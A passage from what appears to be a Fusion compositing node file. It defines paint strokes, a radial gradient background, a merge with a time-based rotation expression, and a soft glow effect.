				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.304550758459743, Y = -0.116880228873688, RX = -0.00933488914819136, RY = -0.0223001337437764 },
							{ Linear = true, X = 0.276546091015169, Y = -0.183780630105017, LX = 0.00933488914819136, LY = 0.0223001337437764, RX = -0.0152163699450459, RY = -0.0158803511623041 },
							{ Linear = true, X = 0.230896981180032, Y = -0.23142168359193, LX = 0.0152163699450459, LY = 0.0158803511623041 }
						}
					},
				}
			},
		},
		PolylineStroke11 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke10"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.319027957004433, Y = 0.070216884357176, RX = 0.00295334144192968, RY = -0.0150431232571372 },
							{ Linear = true, X = 0.327887981330222, Y = 0.0250875145857643, LX = -0.00295334144192968, LY = 0.0150431232571372, RX = -0.00113315527647528, RY = -0.0124308756127338 },
							{ Linear = true, X = 0.324488515500796, Y = -0.0122051122524372, LX = 0.00113315527647528, LY = 0.0124308756127338 }
						}
					},
				}
			},
		},
		PolylineStroke10 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke9"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.240386402524993, Y = 0.219373146722263, RX = 0.00972167503618845, RY = -0.0112926646797966 },
							{ Linear = true, X = 0.269551427633558, Y = 0.185495152682874, LX = -0.00972167503618845, LY = 0.0112926646797966, RX = 0.00661004532012466, RY = -0.0121457582500355 },
							{ Linear = true, X = 0.289381563593932, Y = 0.149057877932767, LX = -0.00661004532012466, LY = 0.0121457582500355 }
						}
					},
				}
			},
		},
		PolylineStroke9 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke8"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0740599134763391, Y = 0.316229125114281, RX = 0.0177093170559228, RY = -0.00680994174365585 },
							{ Linear = true, X = 0.127187864644107, Y = 0.295799299883314, LX = -0.0177093170559228, LY = 0.00680994174365585, RX = 0.0159514379478487, RY = -0.00759218482569361 },
							{ Linear = true, X = 0.175042178487653, Y = 0.273022745406233, LX = -0.0159514379478487, LY = 0.00759218482569361 }
						}
					},
				}
			},
		},
		PolylineStroke8 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke7"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.323833232985785, Y = 0.0297354487212619, RX = 0.0023315544605369, RY = 0.015923256203207 },
							{ Linear = true, X = -0.316838569604174, Y = 0.077505217330883, LX = -0.0023315544605369, LY = -0.015923256203207, RX = 0.00584297702366321, RY = 0.0171443130095034 },
							{ Linear = true, X = -0.299309638533185, Y = 0.128938156359393, LX = -0.00584297702366321, LY = -0.0171443130095034 }
						}
					},
				}
			},
		},
		PolylineStroke7 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke6"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.138446044587865, Y = -0.294157573917388, RX = -0.0234140258992023, RY = 0.0143431193757535 },
							{ Linear = true, X = -0.208688122285472, Y = -0.251128215790128, LX = 0.0234140258992023, LY = -0.0143431193757535, RX = -0.0171607668107646, RY = 0.0166182826336514 },
							{ Linear = true, X = -0.260170422717766, Y = -0.201273367889173, LX = 0.0171607668107646, LY = -0.0166182826336514, RX = -0.00864256298143814, RY = 0.0143878943138941 },
							{ Linear = true, X = -0.28609811166208, Y = -0.158109684947491, LX = 0.00864256298143814, LY = -0.0143878943138941 }
						}
					},
				}
			},
		},
		PolylineStroke6 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke5"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.149358226371062, Y = -0.289971497645227, RX = -0.020109499116146, RY = -0.00859982114538849 },
							{ Linear = true, X = 0.0890297290226238, Y = -0.315770961081392, LX = 0.020109499116146, LY = 0.00859982114538849, RX = -0.0224513032027859, RY = -0.00325971757555373 },
							{ Linear = true, X = 0.0216758194142661, Y = -0.325550113808054, LX = 0.0224513032027859, LY = 0.00325971757555373 }
						}
					},
				}
			},
		},
		PolylineStroke5 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke4"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.411023855032417, Y = 0.0318922160737311, RX = -0.000485197885173483, RY = -0.0271612715578326 },
							{ Linear = true, X = 0.409568261376896, Y = -0.0495915985997666, LX = 0.000485197885173483, LY = 0.0271612715578326, RX = -0.00479842148954692, RY = -0.021654408128841 },
							{ Linear = true, X = 0.395172996908255, Y = -0.11455482298629, LX = 0.00479842148954692, LY = 0.021654408128841 }
						}
					},
				}
			},
		},
		PolylineStroke4 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke3"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.352402777948181, Y = 0.213169627987373, RX = 0.0126569928074114, RY = 0.0168761971990655 },
							{ Linear = true, X = -0.314431799525947, Y = 0.26379821958457, LX = -0.0126569928074114, LY = -0.0168761971990655, RX = 0.0160809555219423, RY = 0.0168708211251655 },
							{ Linear = true, X = -0.26618893296012, Y = 0.314410682960066, LX = -0.0160809555219423, LY = -0.0168708211251655 }
						}
					},
				}
			},
		},
		PolylineStroke3 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.148678414096916, Y = -0.383324160704458, RX = 0.0150513950073421, RY = -0.00476976701522656 },
							{ Linear = true, X = -0.10352422907489, Y = -0.397633461750138, LX = -0.0150513950073421, LY = 0.00476976701522656, RX = 0.0139500734214391, RY = -0.00293524124013942 },
							{ Linear = true, X = -0.0616740088105727, Y = -0.406439185470556, LX = -0.0139500734214391, LY = 0.00293524124013942 }
						}
					},
				}
			},
		},
		PolylineStroke20 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke19"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0912068965517241, Y = -0.0605172413793104, RX = -0.00609195402298849, RY = -0.00735632183908045 },
							{ Linear = true, X = 0.0729310344827586, Y = -0.0825862068965517, LX = 0.00609195402298849, LY = 0.00735632183908045, RX = -0.00944906856916368, RY = -0.00557273087594134 },
							{ Linear = true, X = 0.0445838287752676, Y = -0.0993043995243757, LX = 0.00944906856916368, LY = 0.00557273087594134, RX = -0.0104359889021007, RY = -0.00270313119302417 },
							{ Linear = true, X = 0.0132758620689655, Y = -0.107413793103448, LX = 0.0104359889021007, LY = 0.00270313119302417, RX = -0.0114942528735632, RY = 0.000114942528735622 },
							{ Linear = true, X = -0.0212068965517241, Y = -0.107068965517241, LX = 0.0114942528735632, LY = -0.000114942528735622 }
						}
					},
				}
			},
		},
		PolylineStroke19 = PolylineStroke {
			Points = {
			},
			IsThreaded = true,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke18"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0607299383660954, Y = 0.0901775524331088, RX = 0.00926143276532942, RY = -0.00892853338758316 },
							{ Linear = true, X = 0.0885142366620837, Y = 0.0633919522703593, LX = -0.00926143276532942, LY = 0.00892853338758316, RX = 0.00379183271032179, RY = -0.00721677168689612 },
							{ Linear = true, X = 0.0998897347930491, Y = 0.041741637209671, LX = -0.00379183271032179, LY = 0.00721677168689612, RX = 0.00216708363812143, RY = -0.0071942310374513 },
							{ Linear = true, X = 0.106390985707413, Y = 0.0201589440973171, LX = -0.00216708363812143, LY = 0.0071942310374513 }
						}
					},
				}
			},
		},
		PolylineStroke18 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke17"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.105344827586207, Y = 0.0232758620689655, RX = 0.00137931034482758, RY = 0.00517241379310348 },
							{ Linear = true, X = -0.101206896551724, Y = 0.0387931034482759, LX = -0.00137931034482758, LY = -0.00517241379310348, RX = 0.00218390804597701, RY = 0.00551724137931031 },
							{ Linear = true, X = -0.0946551724137931, Y = 0.0553448275862068, LX = -0.00218390804597701, LY = -0.00551724137931031 }
						}
					},
				}
			},
		},
		PolylineStroke17 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = { ""CircleBrush"" },
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				[""CircleBrush.Size""] = Input { Value = 0.0125, },
				Polyline = Input {
					Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.067029843675983, Y = -0.0856432125088841, LX = -0.00479368859283589, LY = 0.00388608224429119, RX = -0.00479368859283589, RY = 0.00388608224429119 },
							{ Linear = true, X = -0.0814109094544906, Y = -0.0739849657760105, LX = 0.00479368859283589, LY = -0.00388608224429119, RX = 0.00479368859283589, RY = -0.00388608224429119 }
						}
					},
				}
			},
		},
		PolylineStroke24 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke23"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = 0.0726989773232548, Y = -0.0569141840818141, RX = -0.00489106269453092, RY = -0.00448848620499789 },
							{ Linear = true, X = 0.0580257892396621, Y = -0.0703796426968078, LX = 0.00489106269453092, LY = 0.00448848620499789, RX = -0.0062249888839484, RY = -0.00380049032348606 },
							{ Linear = true, X = 0.0393508225878169, Y = -0.081781113667266, LX = 0.0062249888839484, LY = 0.00380049032348606 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke23 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke22"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.0211204979991107, Y = 0.0884837705646955, RX = 0.00696433557033099, RY = 0.000445503772563841 },
							{ Linear = true, X = -0.00022749128811772, Y = 0.089820281882387, LX = -0.00696433557033099, LY = -0.000445503772563841, RX = 0.00799580175168291, RY = -0.000737623267533201 },
							{ Linear = true, X = 0.023759913966931, Y = 0.0876074120797874, LX = -0.00799580175168291, LY = 0.000737623267533201, RX = 0.00651988707959883, RY = -0.00233366731025953 },
							{ Linear = true, X = 0.0433195752057275, Y = 0.0806064101490088, LX = -0.00651988707959883, LY = 0.00233366731025953 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke22 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""PolylineStroke21"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.0905778306192983, Y = 0.00666963094708761, RX = 0.000327484965584994, RY = 0.0062249888839484 },
							{ Linear = true, X = -0.0895953757225433, Y = 0.0253445975989328, LX = -0.000327484965584994, LY = -0.0062249888839484, RX = 0.00192678227360308, RY = 0.00444642063139174 },
							{ Linear = true, X = -0.0838150289017341, Y = 0.038683859493108, LX = -0.00192678227360308, LY = -0.00444642063139174, RX = 0.00192678227360308, RY = 0.00281606639988145 },
							{ Linear = true, X = -0.0780346820809248, Y = 0.0471320586927524, LX = -0.00192678227360308, LY = -0.00281606639988145 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		PolylineStroke21 = PolylineStroke {
			Points = {
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			CtrlWShown = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Polyline = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, X = -0.043757292882147, Y = -0.0803441236512102, RX = -0.00583430571761961, RY = 0.0032012836051046 },
							{ Linear = true, X = -0.0612602100350059, Y = -0.0707402728358965, LX = 0.00583430571761961, LY = -0.0032012836051046, RX = -0.00422892455690908, RY = 0.00506181887832604 },
							{ Linear = true, X = -0.0739469837057331, Y = -0.0555548162009184, LX = 0.00422892455690908, LY = -0.00506181887832604, RX = -0.00262724658518423, RY = 0.00429538473379913 },
							{ Linear = true, X = -0.0818287234612858, Y = -0.042668661999521, LX = 0.00262724658518423, LY = -0.00429538473379913 }
						}
					},
				},
				[""CircleBrush.Size""] = Input { Value = 0.0125, }
			},
		},
		Background1_3 = Background {
			NameSet = true,
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""MaskPaint2"",
					Source = ""Mask"",
				},
				ApplyMaskInverted = Input { Value = 1, },
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Gradient"" }, },
				TopLeftRed = Input { Value = 0.5, },
				TopLeftGreen = Input { Value = 0.5, },
				TopLeftBlue = Input { Value = 0.5, },
				GradientType = Input { Value = FuID { ""Radial"" }, },
				Start = Input { Value = { 0.5, 0.5 }, },
				End = Input { Value = { 0.914, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0.214521452145215] = { 0, 0, 0, 0 },
							[0.216312056737589] = { 0.988235294818878, 0.764705896377563, 0.533333361148834, 1 },
							[0.221782178217822] = { 0.988235294818878, 0.764705896377563, 0.533333361148834, 1 },
							[0.223648648648649] = { 0, 0, 0, 0 },
							[0.256448047162859] = { 0, 0, 0, 0 },
							[0.259395725865881] = { 1, 1, 1, 1 },
							[0.263080324244657] = { 1, 1, 1, 1 },
							[0.266028002947679] = { 0, 0, 0, 0 },
							[0.305498981670061] = { 0, 0, 0, 0 },
							[0.306517311608961] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.312627291242363] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.314876584389593] = { 0, 0, 0, 0 },
							[0.473755964553511] = { 0, 0, 0, 0 },
							[0.476942514213519] = { 1, 0.896712068965537, 0.7898, 1 },
							[0.483299250170416] = { 1, 0.879169827586207, 0.7541, 1 },
							[0.485344239945467] = { 0, 0, 0, 0 },
							[0.596904937361828] = { 0, 0, 0, 0 },
							[0.600589535740604] = { 1, 1, 1, 1 },
							[0.605747973470892] = { 1, 1, 1, 1 },
							[0.608695652173913] = { 0, 0, 0, 0 },
							[0.783345615327929] = { 0, 0, 0, 0 },
							[0.787030213706706] = { 1, 1, 1, 1 },
							[0.792925571112749] = { 1, 1, 1, 1 },
							[0.796610169491525] = { 0, 0, 0, 0 },
							[0.987472365512159] = { 0, 0, 0, 0 },
							[0.990420044215181] = { 1, 1, 1, 1 },
							[0.995578481945468] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 0 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5335, 445.5 } },
		},
		Merge4_1 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background1_3"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""SoftGlow1_2_2"",
					Source = ""Output"",
				},
				Angle = Input {
					Value = -7.9,
					Expression = ""-time*0.1"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 445.5 } },
		},
		SoftGlow1_2_1_1 = SoftGlow {
			Inputs = {
				Blend = Input { Value = 0.5, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				Threshold = Input { Value = 0.606, },
				Gain = Input { Value = 1.25, },
				XGlowSize = Input { Value = 23.9, },
				ClippingMode = Input { Value = FuID { ""Domain"" }, },
				ColorScale = Input { Value = 1, },
				RedScale = Input { Value = 1.4, },
				BlueScale = Input { Value = 0.6, },
				Input = Input {
					SourceOp = ""Merge4_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 511.5 } },
		},
		Paint1 = Paint {
			Inputs = {
				Input = Input {
					SourceOp = ""SoftGlow1_2_1_1"",
					Source = ""Output"",
				},
				Paint = Input {
					SourceOp = ""Stroke153"",
					Source = ""Out"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 577.5 } },
		},
		Stroke153 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379033940 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke152"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.983261108398438, 0.320204794406891 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke152 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379031450 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke151"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.983654975891113, 0.270578980445862 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke151 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379026185 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke150"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.849744021892548, 0.305238276720047 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke150 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379024145 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke149"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.652028381824493, 0.211500585079193 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke149 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379021924 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke148"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.653997659683228, 0.239070504903793 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke148 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379019510 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke147"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.676053583621979, 0.248916894197464 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke147 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379017830 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke146"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.616187453269958, 0.269397407770157 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke146 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379016150 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke145"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.656754612922668, 0.29814887046814 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke145 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379013735 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke144"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.586648285388947, 0.315084666013718 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke144 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379011590 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke143"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.562623083591461, 0.306025981903076 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke143 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379009745 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke142"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.595313131809235, 0.270972818136215 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke142 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379007750 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke141"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.597282409667969, 0.249310746788979 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke141 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379005695 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke140"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.596888542175293, 0.229224100708961 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke140 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379003505 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke139"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.543324172496796, 0.218983858823776 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke139 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1379001765 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke138"",
					Source = ""Out"",
				},
